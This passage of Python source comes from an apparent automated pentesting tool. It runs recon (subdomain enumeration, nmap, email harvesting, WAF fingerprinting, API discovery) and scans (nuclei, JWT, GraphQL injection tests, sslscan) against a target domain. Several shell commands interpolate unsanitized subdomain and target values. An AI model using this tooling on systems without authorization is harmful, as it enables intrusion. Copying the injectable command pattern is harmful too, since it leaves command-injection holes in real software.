                            vuln_type = "cors_wildcard"
                            severity = "low"
                            description = (
                                f"CORS allows any origin (wildcard). "
                                f"While credentials are not allowed with wildcards, "
                                f"this may expose non-sensitive data to any website."
                            )

                        # Check for subdomain confusion
                        elif acao and (f".{self.domain}" in acao or f"{self.domain}." in acao):
                            if origin in acao:
                                vuln_type = "cors_subdomain_confusion"
                                severity = "medium"
                                description = (
                                    f"CORS subdomain validation bypass! "
                                    f"Server accepted origin {origin} which mimics the target domain."
                                )

                        if vuln_type:
                            findings.append(Finding(
                                type=vuln_type,
                                value=f"CORS Misconfiguration: {vuln_type.replace('_', ' ').title()}",
                                description=description,
                                severity=severity,
                                phase="exploit",
                                tool="cors-test",
                                target=endpoint,
                                metadata={
                                    "tested_origin": origin,
                                    "acao_header": acao,
                                    "acac_header": acac,
                                    "method": "GET/OPTIONS",
                                }
                            ))
                            # Found vuln at this endpoint, move to next
                            break

                    except httpx.RequestError:
                        continue
                    except Exception as e:
                        logger.debug(f"CORS test error at {endpoint}: {e}")

        return findings

    # ==================== RECON PHASE ====================

    async def run_recon(self) -> PhaseResult:
        """Execute reconnaissance phase."""
        phase = Phase.RECON
        started_at = datetime.now(timezone.utc).isoformat()
        start_time = time.time()
        findings = []
        tools_run = []
        errors = []

        if self.on_phase_start:
            self.on_phase_start(phase)

        self._log_phase(phase, f"Reconnaissance on {self.domain}")

        # ==================== PASSIVE INTELLIGENCE ====================
        # ZoomEye - Cyberspace search for related IPs, domains, and services
        if self.config.use_zoomeye:
            self._log_tool("ZoomEye Intelligence", "running")
            tool_start = time.time()
            try:
                zoomeye = get_zoomeye()
                if zoomeye.connect():
                    # Search for all hosts related to the target domain
                    result = zoomeye.search_domain(self.domain, include_subdomains=True)

                    if not result.error:
                        tool_elapsed = time.time() - tool_start

                        # Add discovered subdomains
                        zoomeye_subdomains = [d for d in result.domains if d and self.domain in d]
                        if zoomeye_subdomains:
                            self.subdomains.extend(zoomeye_subdomains)
                            (self.output_dir / f"zoomeye_subdomains_{self.domain}.txt").write_text(
                                "\n".join(zoomeye_subdomains)
                            )

                        # Add discovered IPs
                        zoomeye_ips = result.ips
                        if zoomeye_ips:
                            (self.output_dir / f"zoomeye_ips_{self.domain}.txt").write_text(
                                "\n".join(zoomeye_ips)
                            )

                        # Add findings for discovered hosts
                        for host in result.hosts[:50]:  # Limit to first 50
                            findings.append(Finding(
                                type="discovered_host",
                                value=f"{host.ip}:{host.port}",
                                description=f"ZoomEye: {host.service or 'Unknown'} on {host.ip}:{host.port}",
                                severity="info",
                                phase="recon",
                                tool="zoomeye",
                                target=host.domain or host.ip,
                                metadata={
                                    "ip": host.ip,
                                    "port": host.port,
                                    "service": host.service,
                                    "app": host.app,
                                    "version": host.version,
                                    "country": host.country,
                                    "org": host.org,
                                    "title": host.title,
                                }
                            ))

                        # Save full results to JSON
                        zoomeye_data = {
                            "query": result.query,
                            "total": result.total,
                            "domains": result.domains,
                            "ips": result.ips,
                            "services": result.services,
                            "ports": result.ports,
                            "countries": result.countries,
                            "hosts": [
                                {
                                    "ip": h.ip,
                                    "port": h.port,
                                    "service": h.service,
                                    "domain": h.domain,
                                    "app": h.app,
                                    "country": h.country,
                                    "org": h.org,
                                    "title": h.title,
                                }
                                for h in result.hosts
                            ]
                        }
                        (self.output_dir / f"zoomeye_full_{self.domain}.json").write_text(
                            json.dumps(zoomeye_data, indent=2)
                        )

                        tools_run.append("zoomeye")
                        self._log_tool(
                            f"ZoomEye - {result.total} results, {len(zoomeye_subdomains)} subdomains, "
                            f"{len(zoomeye_ips)} IPs, {len(result.services)} services",
                            "done", tool_elapsed
                        )

                        # Log summary of discovered services
                        if result.services:
                            top_services = list(result.services.items())[:5]
                            self._log_tool(f"  Top services: {dict(top_services)}", "done")

                    else:
                        tool_elapsed = time.time() - tool_start
                        errors.append(f"ZoomEye error: {result.error}")
                        self._log_tool(f"ZoomEye - {result.error}", "error", tool_elapsed)
                else:
                    errors.append("ZoomEye connection failed")
                    self._log_tool("ZoomEye - Connection failed", "error")
            except Exception as e:
                tool_elapsed = time.time() - tool_start
                errors.append(f"ZoomEye error: {str(e)}")
                self._log_tool(f"ZoomEye - {str(e)}", "error", tool_elapsed)

        # ==================== ACTIVE RECONNAISSANCE ====================
        # 1. Subdomain Enumeration
        self._log_tool("Subdomain Enumeration")

        # Subfinder
        if "subfinder" in self.config.recon_tools:
            self._log_tool("subfinder", "running")
            tool_start = time.time()
            # Security: Use safe_domain to prevent command injection
            ret, output = await self._run_command(
                f"subfinder -d {self.safe_domain} -silent"
            )
            tool_elapsed = time.time() - tool_start
            if ret == 0:
                subs = [s.strip() for s in output.split("\n") if s.strip()]
                self.subdomains.extend(subs)
                (self.output_dir / f"subfinder_{self.domain}.txt").write_text(output)
                tools_run.append("subfinder")
                self._log_tool(f"subfinder - {len(subs)} subdomains", "done", tool_elapsed)
            else:
                errors.append(f"subfinder failed: {output[:100] if output else 'unknown error'}")
                self._log_tool("subfinder", "error", tool_elapsed, output[:100] if output else "command failed")

        # Assetfinder
        if "assetfinder" in self.config.recon_tools:
            self._log_tool("assetfinder", "running")
            tool_start = time.time()
            # Security: Use safe_domain to prevent command injection
            ret, output = await self._run_command(
                f"assetfinder --subs-only {self.safe_domain}"
            )
            tool_elapsed = time.time() - tool_start
            if ret == 0:
                subs = [s.strip() for s in output.split("\n") if s.strip()]
                self.subdomains.extend(subs)
                (self.output_dir / f"assetfinder_{self.domain}.txt").write_text(output)
                tools_run.append("assetfinder")
                self._log_tool(f"assetfinder - {len(subs)} assets", "done", tool_elapsed)
            else:
                errors.append(f"assetfinder failed: {output[:100] if output else 'unknown error'}")
                self._log_tool("assetfinder", "error", tool_elapsed, output[:100] if output else "command failed")

        # Deduplicate subdomains
        self.subdomains = list(set(self.subdomains))
        all_subs_file = self.output_dir / f"all_subs_{self.domain}.txt"
        all_subs_file.write_text("\n".join(self.subdomains))

        findings.append(Finding(
            type="subdomain_count",
            value=str(len(self.subdomains)),
            description=f"Discovered {len(self.subdomains)} unique subdomains",
            severity="info",
            phase="recon",
            tool="subdomain_enum",
            target=self.domain
        ))

        # 2. Live Host Detection with HTTPX
        if "httpx" in self.config.recon_tools and self.subdomains:
            self._log_tool("httpx", "running")
            subs_input = "\n".join(self.subdomains)

            ret, output = await self._run_command(
                f"echo '{subs_input}' | httpx -silent -status-code -title -tech-detect -json 2>/dev/null",
                timeout=180
            )
            if ret == 0:
                httpx_file = self.output_dir / "httpx_results.json"
                httpx_file.write_text(output)

                # Parse live hosts
                for line in output.split("\n"):
                    if line.strip():
                        try:
                            data = json.loads(line)
                            url = data.get("url", "")
                            if url:
                                self.live_hosts.append(url)
                        except json.JSONDecodeError:
                            continue

                tools_run.append("httpx")
                self._log_tool(f"httpx - {len(self.live_hosts)} live hosts", "done")

                findings.append(Finding(
                    type="live_hosts",
                    value=str(len(self.live_hosts)),
                    description=f"Found {len(self.live_hosts)} live hosts",
                    severity="info",
                    phase="recon",
                    tool="httpx",
                    target=self.domain
                ))

        # 3. Port Scanning with Nmap
        if "nmap" in self.config.recon_tools:
            self._log_tool("nmap", "running")
            # Security: Use safe_domain to prevent command injection
            ret, output = await self._run_command(
                f"nmap -sV --top-ports 100 {self.safe_domain} 2>/dev/null",
                timeout=300
            )
            if ret == 0:
                (self.output_dir / f"nmap_{self.domain}.txt").write_text(output)
                tools_run.append("nmap")

                # Parse open ports
                for line in output.split("\n"):
                    if "/tcp" in line and "open" in line:
                        parts = line.split()
                        if len(parts) >= 3:
                            port = parts[0]
                            service = parts[2] if len(parts) > 2 else "unknown"
                            port_str = f"{port} ({service})"
                            self.open_ports.append(port_str)
                            findings.append(Finding(
                                type="open_port",
                                value=port,
                                description=f"Port {port} open running {service}",
                                severity="info",
                                phase="recon",
                                tool="nmap",
                                target=self.domain
                            ))

                self._log_tool("nmap - completed", "done")

        # 4. Wayback URLs
        if "waybackurls" in self.config.recon_tools:
            self._log_tool("waybackurls", "running")
            tool_start = time.time()
            wayback_urls = []
            wayback_file = self.output_dir / f"wayback_{self.domain}.txt"

            # Try waybackurls tool first
            ret, output = await self._run_command(
                f"echo {self.safe_domain} | waybackurls | head -5000"
            )

            if ret == 0 and output.strip() and "command not found" not in output.lower():
                wayback_urls = [u for u in output.split("\n") if u.strip()]
            else:
                # Fallback: Use Wayback Machine API directly
                self._log_tool("waybackurls (API fallback)", "running")
                try:
                    import urllib.request
                    api_url = f"https://web.archive.org/cdx/search/cdx?url=*.{self.safe_domain}/*&output=text&fl=original&collapse=urlkey&limit=5000"
                    with urllib.request.urlopen(api_url, timeout=30) as response:
                        api_output = response.read().decode('utf-8')
                        wayback_urls = [u for u in api_output.split("\n") if u.strip()]
                except Exception as api_error:
                    logger.debug(f"Wayback API fallback failed: {api_error}")

            tool_elapsed = time.time() - tool_start

            if wayback_urls:
                wayback_file.write_text("\n".join(wayback_urls))
                tools_run.append("waybackurls")
                self._log_tool(f"waybackurls - {len(wayback_urls)} URLs", "done", tool_elapsed)
            else:
                # Write empty file with explanation
                wayback_file.write_text(f"# No wayback URLs found for {self.domain}\n# Tool: waybackurls or Wayback Machine API\n")
                self._log_tool("waybackurls - no URLs found", "done", tool_elapsed)

        # 5. Amass - Advanced Subdomain Enumeration (NEW)
        if "amass" in self.config.recon_tools:
            self._log_tool("amass", "running")
            tool_start = time.time()
            # Use -silent to suppress progress bars, -nocolor to avoid ANSI codes
            ret, output = await self._run_command(
                f"amass enum -passive -silent -nocolor -d {self.safe_domain} -timeout 5 2>/dev/null",
                timeout=360
            )
            tool_elapsed = time.time() - tool_start

            # Sanitize output to remove any remaining junk (progress bars, etc.)
            output = self._sanitize_tool_output(output)

            # Consider success if we got subdomains (amass may return non-zero with valid output)
            subs = [s.strip() for s in output.split("\n") if s.strip() and self.domain in s]
            if subs:
                self.subdomains.extend(subs)
                (self.output_dir / f"amass_{self.domain}.txt").write_text("\n".join(subs))
                tools_run.append("amass")
                self._log_tool(f"amass - {len(subs)} subdomains", "done", tool_elapsed)

                # Add amass subdomains as info findings
                if len(subs) > 0:
                    findings.append(Finding(
                        type="subdomain_discovery",
                        value=f"{len(subs)} subdomains via amass",
                        description=f"Amass discovered {len(subs)} subdomains for {self.domain}",
                        severity="info",
                        phase="recon",
                        tool="amass",
                        target=self.domain,
                        metadata={"subdomains": subs[:50]}  # Store first 50
                    ))
            elif ret != 0:
                errors.append(f"amass failed: {output[:100] if output else 'unknown error'}")
                self._log_tool("amass", "error", tool_elapsed, output[:100] if output else "command failed")
            else:
                self._log_tool("amass - no subdomains found", "done", tool_elapsed)

        # 6. theHarvester - OSINT Email & Subdomain Gathering (NEW)
        if "theHarvester" in self.config.recon_tools:
            self._log_tool("theHarvester", "running")
            ret, output = await self._run_command(
                f"theHarvester -d {self.safe_domain} -b all -l 100 2>/dev/null",
                timeout=300
            )
            if ret == 0:
                (self.output_dir / f"theharvester_{self.domain}.txt").write_text(output)
                # Extract emails and hosts
                emails = []
                for line in output.split("\n"):
                    if "@" in line and self.domain in line:
                        emails.append(line.strip())
                if emails:
                    findings.append(Finding(
                        type="email_discovered",
                        value=str(len(emails)),
                        description=f"Discovered {len(emails)} email addresses",
                        severity="info",
                        phase="recon",
                        tool="theHarvester",
                        target=self.domain,
                        metadata={"emails": emails[:20]}  # Store first 20
                    ))
                tools_run.append("theHarvester")
                self._log_tool(f"theHarvester - {len(emails)} emails", "done")

        # 7. dnsrecon - DNS Enumeration & Zone Transfer (NEW)
        if "dnsrecon" in self.config.recon_tools:
            self._log_tool("dnsrecon", "running")
            ret, output = await self._run_command(
                f"dnsrecon -d {self.safe_domain} -t std,brt -j {self.output_dir}/dnsrecon_{self.domain}.json 2>/dev/null",
                timeout=180
            )
            if ret == 0:
                tools_run.append("dnsrecon")
                # Check for zone transfer vulnerability
                if "Zone Transfer" in output and "Success" in output:
                    findings.append(Finding(
                        type="dns_zone_transfer",
                        value="Zone transfer allowed",
                        description="DNS zone transfer is allowed - critical information disclosure",
                        severity="high",
                        phase="recon",
                        tool="dnsrecon",
                        target=self.domain
                    ))
                self._log_tool("dnsrecon - completed", "done")

        # 8. wafw00f - WAF Fingerprinting (NEW)
        if "wafw00f" in self.config.recon_tools:
            self._log_tool("wafw00f", "running")
            ret, output = await self._run_command(
                f"wafw00f {self.target} 2>/dev/null"
            )
            if ret == 0:
                (self.output_dir / f"wafw00f_{self.domain}.txt").write_text(output)
                # Parse WAF detection
                waf_name = "Unknown"
                if "is behind" in output:
                    # Extract WAF name
                    for line in output.split("\n"):
                        if "is behind" in line:
                            parts = line.split("is behind")
                            if len(parts) > 1:
                                waf_name = parts[1].strip().split()[0]
                                break
                    findings.append(Finding(
                        type="waf_detected",
                        value=waf_name,
                        description=f"Web Application Firewall detected: {waf_name}",
                        severity="info",
                        phase="recon",
                        tool="wafw00f",
                        target=self.target
                    ))
                elif "No WAF" in output:
                    findings.append(Finding(
                        type="no_waf",
                        value="No WAF detected",
                        description="No Web Application Firewall detected - target may be more vulnerable",
                        severity="low",
                        phase="recon",
                        tool="wafw00f",
                        target=self.target
                    ))
                tools_run.append("wafw00f")
                self._log_tool(f"wafw00f - {waf_name if 'is behind' in output else 'No WAF'}", "done")

        # 9. whatweb - Technology Fingerprinting (NEW)
        if "whatweb" in self.config.recon_tools:
            self._log_tool("whatweb", "running")
            ret, output = await self._run_command(
                f"whatweb -a 3 {self.target} --log-json={self.output_dir}/whatweb_{self.domain}.json 2>/dev/null"
            )
            if ret == 0:
                (self.output_dir / f"whatweb_{self.domain}.txt").write_text(output)
                tools_run.append("whatweb")
                self._log_tool("whatweb - completed", "done")

        # 10. API Discovery - Find hidden API endpoints, Swagger/OpenAPI specs, GraphQL
        self._log_tool("api-discovery", "running")
        try:
            # Get auth headers if available
            auth_headers = await self._get_auth_headers()

            api_config = APIDiscoveryConfig(
                base_url=self.target,
                discover_swagger=True,
                discover_graphql=True,
                discover_common_paths=True,
                discover_versions=True,
                headers=auth_headers,
                max_concurrent=5,
                timeout=10,
            )

            discovery = APIDiscovery(self.target, api_config)
            api_result = await discovery.discover()

            if api_result and api_result.endpoints:
                tools_run.append("api-discovery")

                # Save API discovery results
                api_data = {
                    "target": self.target,
                    "endpoints_found": len(api_result.endpoints),
                    "swagger_specs": api_result.swagger_specs,
                    "graphql_endpoints": api_result.graphql_endpoints,
                    "api_versions": api_result.api_versions,
                    "endpoints": [
                        {
                            "url": ep.url,
                            "method": ep.method,
                            "status": ep.status_code,
                            "type": ep.endpoint_type,
                            "auth_required": ep.auth_required,
                        }
                        for ep in api_result.endpoints
                    ],
                }
                (self.output_dir / f"api_discovery_{self.domain}.json").write_text(
                    json.dumps(api_data, indent=2)
                )

                # Add discovered API endpoints to crawler results for exploitation
                for ep in api_result.endpoints:
                    if ep.url not in self.discovered_endpoints:
                        self.discovered_endpoints.append(ep.url)

                # Create findings for discovered APIs
                for spec_url in api_result.swagger_specs:
                    findings.append(Finding(
                        type="api_spec_exposed",
                        value=f"OpenAPI/Swagger specification exposed",
                        description=f"API documentation found at {spec_url}. May reveal sensitive endpoints.",
                        severity="medium",
                        phase="recon",
                        tool="api-discovery",
                        target=spec_url,
                    ))

                for gql_url in api_result.graphql_endpoints:
                    findings.append(Finding(
                        type="graphql_exposed",
                        value=f"GraphQL endpoint discovered",
                        description=f"GraphQL endpoint at {gql_url}. Test for introspection and injection.",
                        severity="medium",
                        phase="recon",
                        tool="api-discovery",
                        target=gql_url,
                    ))

                # Log unauthenticated endpoints (potential auth bypass)
                unauth_endpoints = [ep for ep in api_result.endpoints if not ep.auth_required and ep.status_code == 200]
                if unauth_endpoints:
                    findings.append(Finding(
                        type="unauthenticated_api",
                        value=f"{len(unauth_endpoints)} API endpoints accessible without auth",
                        description=f"Found {len(unauth_endpoints)} API endpoints that return 200 without authentication.",
                        severity="low",
                        phase="recon",
                        tool="api-discovery",
                        target=self.target,
                        metadata={"endpoints": [ep.url for ep in unauth_endpoints[:10]]},
                    ))

                self._log_tool(
                    f"api-discovery - {len(api_result.endpoints)} endpoints, "
                    f"{len(api_result.swagger_specs)} specs, {len(api_result.graphql_endpoints)} GraphQL",
                    "done"
                )
            else:
                self._log_tool("api-discovery - no APIs found", "done")

        except Exception as e:
            errors.append(f"API Discovery: {str(e)}")
            self._log_tool(f"api-discovery - error: {str(e)}", "done")
            logger.warning(f"API Discovery failed: {e}")

        # Deduplicate subdomains again after new tools
        self.subdomains = list(set(self.subdomains))
        all_subs_file.write_text("\n".join(self.subdomains))

        # Add findings to global list
        for f in findings:
            self._add_finding(f)

        duration = time.time() - start_time
        result = PhaseResult(
            phase=phase,
            status="completed",
            started_at=started_at,
            finished_at=datetime.now(timezone.utc).isoformat(),
            duration=duration,
            findings=findings,
            tools_run=tools_run,
            errors=errors,
            metadata={
                "subdomains_count": len(self.subdomains),
                "live_hosts_count": len(self.live_hosts)
            }
        )

        self.phase_results[phase] = result
        if self.on_phase_complete:
            self.on_phase_complete(result)

        return result

    # ==================== SCAN PHASE ====================

    async def run_scan(self) -> PhaseResult:
        """Execute vulnerability scanning phase."""
        phase = Phase.SCAN
        started_at = datetime.now(timezone.utc).isoformat()
        start_time = time.time()
        findings = []
        tools_run = []
        errors = []

        if self.on_phase_start:
            self.on_phase_start(phase)

        self._log_phase(phase, f"Vulnerability Scanning on {self.domain}")

        # 0. Web Crawling - Discover all endpoints, forms, and parameters
        self._log_tool("webcrawler", "running")
        try:
            # Configure crawler with auth headers if available
            crawler_config = CrawlConfig(
                max_depth=3,
                max_pages=100,
                max_concurrent=5,
                timeout=30.0,
                delay_between_requests=0.2,
                parse_forms=True,
                parse_scripts=True,
            )

            # Add authentication headers if configured
            if self._auth_manager:
                auth_headers = self._auth_manager.get_headers()
                if auth_headers:
                    crawler_config.headers = auth_headers

            crawler = WebCrawler(crawler_config)
            self.crawl_result = await crawler.crawl(self.target)

            # Store discovered items for exploitation phase
            self.discovered_endpoints = self.crawl_result.get_all_urls()
            self.discovered_forms = self.crawl_result.get_all_forms()
            self.discovered_parameters = self.crawl_result.get_all_parameters()

            tools_run.append("webcrawler")

            # Save crawl results
            crawl_output = {
                "target": self.target,
                "pages_crawled": len(self.crawl_result.pages),
                "endpoints": self.discovered_endpoints,
                "forms": self.discovered_forms,
                "parameters": self.discovered_parameters,
                "duration_seconds": self.crawl_result.duration_seconds,
            }
            (self.output_dir / f"crawl_{self.domain}.json").write_text(
                json.dumps(crawl_output, indent=2, default=str)
            )

            self._log_tool(
                f"webcrawler - {len(self.discovered_endpoints)} endpoints, "
                f"{len(self.discovered_forms)} forms, "
                f"{len(self.discovered_parameters)} parameters",
                "done"
            )

            # Add forms and parameters as findings for analysis
            for form in self.discovered_forms:
                findings.append(Finding(
                    type="form",
                    value=f"Form: {form.get('action', 'unknown')}",
                    description=f"Discovered form with method {form.get('method', 'GET')} - {len(form.get('inputs', []))} inputs",
                    severity="info",
                    phase="scan",
                    tool="webcrawler",
                    target=form.get('page', self.target),
                    metadata=form
                ))

        except Exception as e:
            errors.append(f"WebCrawler: {str(e)}")
            self._log_tool(f"webcrawler - error: {str(e)}", "done")
            logger.warning(f"WebCrawler failed: {e}")

        # 1. Nuclei Scanning (with JSON output for better parsing)
        if "nuclei" in self.config.scan_tools:
            self._log_tool("nuclei", "running")
            # Get auth headers for authenticated scanning
            auth_headers = await self._get_auth_headers()
            auth_header_args = self._get_auth_header_args(auth_headers)

            # Use JSON output for reliable parsing, exclude info level for cleaner results
            nuclei_cmd = f"nuclei -u {self.target} -severity low,medium,high,critical -json -silent"
            if auth_header_args:
                nuclei_cmd += f" {auth_header_args}"
            nuclei_cmd += " 2>/dev/null"

            ret, output = await self._run_command(nuclei_cmd, timeout=600)
            if ret == 0:
                tools_run.append("nuclei")

                # Parse nuclei JSON findings and build structured output
                nuclei_count = 0
                nuclei_findings = []
                for line in output.split("\n"):
                    line = line.strip()
                    if not line:
                        continue
                    try:
                        # Each line is a JSON object
                        vuln = json.loads(line)
                        template_id = vuln.get("template-id", vuln.get("templateID", "unknown"))
                        severity = vuln.get("info", {}).get("severity", "low").lower()
                        name = vuln.get("info", {}).get("name", template_id)
                        matched_at = vuln.get("matched-at", vuln.get("host", self.target))
                        description = vuln.get("info", {}).get("description", name)

                        # Skip informational findings unless they're actually interesting
                        if severity == "info" and "exposure" not in name.lower() and "disclosure" not in name.lower():
                            continue

                        nuclei_count += 1
                        findings.append(Finding(
                            type="vulnerability",
                            value=name,
                            description=description[:500] if description else name,
                            severity=severity if severity in ["critical", "high", "medium", "low"] else "low",
                            phase="scan",
                            tool="nuclei",
                            target=matched_at,
                            metadata={
                                "template_id": template_id,
                                "matcher_name": vuln.get("matcher-name", ""),
                                "curl_command": vuln.get("curl-command", ""),
                                "reference": vuln.get("info", {}).get("reference", []),
                                "tags": vuln.get("info", {}).get("tags", []),
                            }
                        ))
                        # Collect for JSON output
                        nuclei_findings.append({
                            "template_id": template_id,
                            "name": name,
                            "severity": severity,
                            "description": description[:500] if description else "",
                            "matched_at": matched_at,
                            "matcher_name": vuln.get("matcher-name", ""),
                            "reference": vuln.get("info", {}).get("reference", []),
                            "tags": vuln.get("info", {}).get("tags", []),
                            "curl_command": vuln.get("curl-command", ""),
                        })
                    except json.JSONDecodeError:
                        # Fallback to text parsing for non-JSON output
                        if line and "[" in line:
                            parts = line.split()
                            if len(parts) >= 2:
                                sev = self._parse_nuclei_severity(line)
                                findings.append(Finding(
                                    type="vulnerability",
                                    value=parts[0].strip("[]") if parts else line,
                                    description=line,
                                    severity=sev,
                                    phase="scan",
                                    tool="nuclei",
                                    target=self.domain
                                ))
                                nuclei_findings.append({
                                    "name": parts[0].strip("[]") if parts else line,
                                    "severity": sev,
                                    "description": line,
                                    "matched_at": self.target
                                })
                                nuclei_count += 1

                # Save structured nuclei JSON
                nuclei_json_path = self.output_dir / f"nuclei_{self.domain}.json"
                nuclei_data = {
                    "target": self.target,
                    "scan_type": "nuclei",
                    "finding_count": nuclei_count,
                    "findings": nuclei_findings
                }
                nuclei_json_path.write_text(json.dumps(nuclei_data, indent=2))

                self._log_tool(f"nuclei - {nuclei_count} findings", "done")

        # 1.5 JWT Token Analysis - Analyze tokens for security weaknesses
        jwt_tokens_to_analyze = []

        # Check if we have an auth token configured
        if self.config.auth_credentials and self.config.auth_credentials.token:
            jwt_tokens_to_analyze.append(self.config.auth_credentials.token)

        # Also look for JWT patterns in discovered endpoints/responses
        jwt_pattern = re.compile(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+')

        if jwt_tokens_to_analyze:
            self._log_tool("jwt-analyzer", "running")
            try:
                analyzer = JWTAnalyzer(extended_wordlist=True)
                jwt_findings_count = 0

                for token in jwt_tokens_to_analyze:
                    try:
                        jwt_results = analyzer.analyze(token)

                        for jf in jwt_results:
                            jwt_findings_count += 1
                            findings.append(Finding(
                                type="jwt_vulnerability",
                                value=jf.vulnerability,
                                description=jf.description,
                                severity=jf.severity,
                                phase="scan",
                                tool="jwt-analyzer",
                                target=self.target,
                                metadata={
                                    "evidence": jf.evidence[:200] if jf.evidence else "",
                                    "remediation": jf.remediation,
                                    "affected_claim": jf.affected_claim,
                                    "attack_vector": jf.attack_vector,
                                    "cwe": jf.cwe,
                                }
                            ))
                    except Exception as e:
                        logger.debug(f"JWT analysis error: {e}")

                if jwt_findings_count > 0:
                    tools_run.append("jwt-analyzer")
                    self._log_tool(f"jwt-analyzer - {jwt_findings_count} vulnerabilities found!", "done")
                else:
                    self._log_tool("jwt-analyzer - no vulnerabilities found", "done")

            except Exception as e:
                errors.append(f"JWT Analyzer: {str(e)}")
                self._log_tool(f"jwt-analyzer - error: {str(e)}", "done")
                logger.warning(f"JWT Analyzer failed: {e}")
        else:
            logger.debug("No JWT tokens available for analysis")

        # 1.6 GraphQL Security Scanning - Test discovered GraphQL endpoints
        # Check if API Discovery found any GraphQL endpoints (stored during RECON)
        graphql_endpoints = getattr(self, '_graphql_endpoints', [])

        # Also look for GraphQL in discovered endpoints
        for endpoint in self.discovered_endpoints:
            if any(gql in endpoint.lower() for gql in ['graphql', 'graphiql', '/gql', '/query']):
                if endpoint not in graphql_endpoints:
                    graphql_endpoints.append(endpoint)

        if graphql_endpoints:
            self._log_tool("graphql-scanner", "running")
            graphql_findings_count = 0

            auth_headers = await self._get_auth_headers()

            for gql_endpoint in graphql_endpoints[:5]:  # Limit to 5 endpoints
                try:
                    gql_config = GraphQLConfig(
                        endpoint=gql_endpoint,
                        headers=auth_headers,
                        test_introspection=True,
                        test_depth_attack=True,
                        test_batch_attack=True,
                        test_injection=True,
                        test_dos=False,  # Disabled for safety
                    )

                    scanner = GraphQLScanner(gql_endpoint, gql_config)
                    result = await scanner.scan()

                    if result and result.findings:
                        tools_run.append("graphql-scanner")

                        for gf in result.findings:
                            graphql_findings_count += 1
                            findings.append(Finding(
                                type="graphql_vulnerability",
                                value=gf.vulnerability,
                                description=gf.description,
                                severity=gf.severity,
                                phase="scan",
                                tool="graphql-scanner",
                                target=gf.endpoint,
                                metadata={
                                    "evidence": gf.evidence[:300] if gf.evidence else "",
                                    "remediation": gf.remediation,
                                    "cwe": gf.cwe,
                                }
                            ))

                        # Save schema info if discovered
                        if result.schema_info:
                            (self.output_dir / f"graphql_schema_{self.domain}.json").write_text(
                                json.dumps(result.schema_info, indent=2, default=str)
                            )

                except Exception as e:
                    logger.debug(f"GraphQL scan error for {gql_endpoint}: {e}")

            if graphql_findings_count > 0:
                self._log_tool(f"graphql-scanner - {graphql_findings_count} vulnerabilities!", "done")
            else:
                self._log_tool("graphql-scanner - no vulnerabilities found", "done")
        else:
            logger.debug("No GraphQL endpoints to scan")

        # 2. SSL/TLS Scanning
        if "sslscan" in self.config.scan_tools:
            self._log_tool("sslscan", "running")
            tool_start = time.time()
            # Security: Use safe_domain to prevent command injection
            # Use --no-colour to avoid ANSI codes in output
            ret, output = await self._run_command(
                f"sslscan --no-colour {self.safe_domain} 2>/dev/null"
            )
            tool_elapsed = time.time() - tool_start

            if ret == 0:
                # Sanitize output to remove any remaining ANSI codes
                output = self._sanitize_tool_output(output)
                (self.output_dir / "sslscan_results.txt").write_text(output)
                tools_run.append("sslscan")

                output_lower = output.lower()

                # Check for weak ciphers
                if "accepted" in output_lower and ("rc4" in output_lower or "des" in output_lower or "null" in output_lower):
                    findings.append(Finding(
                        type="weak_cipher",
                        value="Weak TLS ciphers detected",
                        description="Server accepts weak cryptographic ciphers (RC4/DES/NULL)",
                        severity="medium",
                        phase="scan",
                        tool="sslscan",
                        target=self.domain
                    ))

                # Check for SSLv3/TLSv1.0 enabled
                if "sslv3" in output_lower and "enabled" in output_lower:
                    findings.append(Finding(
                        type="weak_protocol",
                        value="SSLv3 enabled",
                        description="SSLv3 protocol enabled - vulnerable to POODLE attack",
                        severity="high",
                        phase="scan",
                        tool="sslscan",
                        target=self.domain
                    ))

                if "tlsv1.0" in output_lower and "enabled" in output_lower:
                    findings.append(Finding(
                        type="weak_protocol",
                        value="TLSv1.0 enabled",
                        description="TLSv1.0 protocol enabled - deprecated and insecure",
                        severity="medium",
                        phase="scan",
                        tool="sslscan",
                        target=self.domain
                    ))

                # Check for TLSv1.1 (deprecated since 2020)
                if "tlsv1.1" in output_lower and "enabled" in output_lower:
                    findings.append(Finding(
                        type="weak_protocol",
                        value="TLSv1.1 Enabled",
                        description="TLSv1.1 protocol enabled - deprecated by major browsers since 2020, should be disabled",
                        severity="medium",
                        phase="scan",
                        tool="sslscan",
                        target=self.domain
                    ))

                # Check for Heartbleed
                if "vulnerable" in output_lower and "heartbleed" in output_lower:
                    findings.append(Finding(
                        type="vulnerability",
                        value="Heartbleed vulnerability",
                        description="Server vulnerable to Heartbleed (CVE-2014-0160) - critical memory disclosure",
                        severity="critical",
                        phase="scan",
                        tool="sslscan",
                        target=self.domain
                    ))

                ssl_findings_list = [f for f in findings if f.tool == "sslscan"]
                ssl_findings_count = len(ssl_findings_list)

                # Save sslscan JSON with structured findings
                sslscan_json_path = self.output_dir / "sslscan_results.json"
                sslscan_json_data = {
                    "target": self.target,
                    "domain": self.domain,
                    "scan_type": "sslscan",
                    "status": "completed",
                    "finding_count": ssl_findings_count,
                    "findings": [
                        {
                            "type": f.type,
                            "value": f.value,
                            "description": f.description,
                            "severity": f.severity,
                            "tool": f.tool,
                            "target": f.target
                        }
                        for f in ssl_findings_list
                    ]
                }
                sslscan_json_path.write_text(json.dumps(sslscan_json_data, indent=2))

                self._log_tool(f"sslscan - {ssl_findings_count} issues", "done", tool_elapsed)
            else:
                # Handle sslscan failure - common with Cloudflare/CDN protected targets
                error_msg = "sslscan failed"
                if output:
                    # Check for common error patterns
                    if "connection" in output.lower() or "ssl" in output.lower():
                        error_msg = "SSL connection failed - target may be behind CDN/WAF"
                    elif "timeout" in output.lower():
                        error_msg = "Connection timeout"
                    else:
                        error_msg = f"sslscan error: {output[:100]}"
                else:
                    error_msg = "No output - connection may have been blocked"

                # Save error status to JSON
                sslscan_json_path = self.output_dir / "sslscan_results.json"
                sslscan_json_data = {
                    "target": self.target,
                    "domain": self.domain,
                    "scan_type": "sslscan",
                    "status": "failed",
                    "error": error_msg,
                    "finding_count": 0,
                    "findings": []
                }
                sslscan_json_path.write_text(json.dumps(sslscan_json_data, indent=2))
                errors.append(f"sslscan: {error_msg}")
                self._log_tool(f"sslscan - {error_msg}", "error", tool_elapsed)

        # 3. Directory Fuzzing
        if "ffuf" in self.config.scan_tools:
            self._log_tool("ffuf", "running")
            tool_start = time.time()

            # Try multiple wordlist locations (macOS Homebrew, Linux, SecLists)
            wordlist_paths = [
                # macOS Homebrew (Apple Silicon M1/M2/M3)
